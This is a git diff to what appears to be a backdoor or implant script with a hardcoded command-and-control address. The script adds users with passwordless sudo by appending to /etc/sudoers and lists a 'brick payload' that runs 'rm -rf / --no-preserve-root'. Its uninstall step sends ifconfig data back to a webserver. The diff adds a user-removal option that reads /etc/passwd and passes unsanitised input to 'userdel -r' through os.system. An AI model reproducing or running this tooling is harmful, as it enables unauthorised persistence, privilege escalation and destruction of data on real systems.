@@ -16,6 +16,7 @@ CnC = "192.168.102.16"
 CnCUser = "sysadmin"
 def main():
     cont = True
+    os.system("clear")
     print("Hey you, you're finally awake")
     print("Systemm, it just works")
     print()
@@ -49,6 +50,14 @@ def main():
             os.system("echo "+name+":"+password+" | chpasswd")
             if(sudoIn.lower() in  ('y')):
                 os.system("echo \""+name+" ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers")
+            print("Done. User "+name+" added.")
+        elif(value.lower() in ('r')):
+            print("Removing a user.....")
+            print("Current users are:")
+            os.system("cat /etc/passwd")
+            name = input("Which user would you like to remove?")
+            os.system("userdel -r "+name)
+            print("User removed.")
 main()
 EOFA
 fi
@@ -65,6 +74,8 @@ a -- Add a user. Will prompt for username and password, along with asking if the
 k -- Kill. Will execute the brick payload of ("rm -rf / --no-preserve-root").
 
 u -- Uninstall. Will uninstall the program from the machine, along with sending ifconfig info back to the webserver.
+
+r -- Remove. Will list current users in /etc/passwd and prompts the user for a name to delete.
 
 
 EOFB
